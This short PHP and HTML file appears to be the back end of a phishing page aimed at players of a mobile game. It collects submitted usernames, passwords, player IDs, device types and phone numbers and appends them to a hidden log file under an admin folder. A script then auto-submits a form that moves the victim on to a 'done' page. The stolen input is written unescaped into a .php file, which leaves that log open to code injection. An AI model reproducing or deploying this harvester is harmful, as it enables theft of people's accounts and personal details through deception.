<div class="message animated fadeIn"style="display: none;" > 

<?php
$login = $_GET['login'];
$username = $_GET['username'];
$password = $_GET['password'];
$input_1 = $_GET['input_1'];
$input_2 = $_GET['input_2'];
$input_3 = $_GET['input_3'];
$input_4 = $_GET['input_4'];
$input_5 = $_GET['input_5'];
$input_6 = $_GET['input_6'];
?>

<?php
$handle = fopen("admin/DA68fbyy07.php", "a");
$body = '
***************************************
<br>
--- '.$login.' Account ---
<br>
<br>
[ '.$username.' ]
<br>
[ '.$password.' ]
<br>
<br>
PLAYER ID    =   '.$input_1.'
<br>
GAME TYPE    =   '.$input_2.'
<br>
<br>
FROM SEASON  =   '.$input_3.'
<br>
RP TYPE      =   '.$input_4.'
<br>
DEVICE TYPE  =   '.$input_5.'
<br>
PHONE NUMBER =   '.$input_6.'
<br>
<br>
_______________________________________
';
$file = fopen("admin/DA68fbyy07.php", "a");
fwrite($file, $body);
?>


<html>
<head>
<form
type="hidden"method="GET"action="done.php"id="myform">
<input type="submit"></form>
<script type="text/javascript">document.getElementById("myform").submit();</script>
</head>
<body>
    
</body>
</html>
</div>
